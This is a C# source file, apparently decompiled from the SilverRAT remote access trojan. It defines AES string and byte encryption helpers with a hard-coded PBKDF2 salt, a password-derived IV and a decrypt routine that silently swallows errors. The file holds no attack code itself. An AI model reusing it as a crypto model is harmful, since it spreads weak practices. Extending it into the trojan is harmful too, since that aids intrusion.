using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace SilverRAT.Algorithm;

public class Encrypt
{
    public static string EncryptTxt(string input, string Password)
    {
        return Convert.ToBase64String(EncryptBytes(Encoding.UTF8.GetBytes(input), Password));
    }

    public static string DecryptTxt(string input, string Password)
    {
        return Encoding.UTF8.GetString(DecryptBytes(Convert.FromBase64String(input), Password));
    }

    public static byte[] DecryptBytes(byte[] cipherBytes, string Password)
    {
        byte[] result;
        using (Aes aes = Aes.Create())
        {
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Password, new byte[13]
            {
                73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
                100, 101, 118
            });
            aes.Key = rfc2898DeriveBytes.GetBytes(32);
            aes.IV = rfc2898DeriveBytes.GetBytes(16);
            using MemoryStream memoryStream = new MemoryStream();
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(cipherBytes, 0, cipherBytes.Length);
                try
                {
                    cryptoStream.Close();
                }
                catch
                {
                    return memoryStream.ToArray();
                }
            }
            result = memoryStream.ToArray();
        }
        return result;
    }

    public static byte[] EncryptBytes(byte[] clearBytes, string Password)
    {
        using Aes aes = Aes.Create();
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Password, new byte[13]
        {
            73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
            100, 101, 118
        });
        aes.Key = rfc2898DeriveBytes.GetBytes(32);
        aes.IV = rfc2898DeriveBytes.GetBytes(16);
        using MemoryStream memoryStream = new MemoryStream();
        using CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
        cryptoStream.Write(clearBytes, 0, clearBytes.Length);
        cryptoStream.Close();
        return memoryStream.ToArray();
    }
}
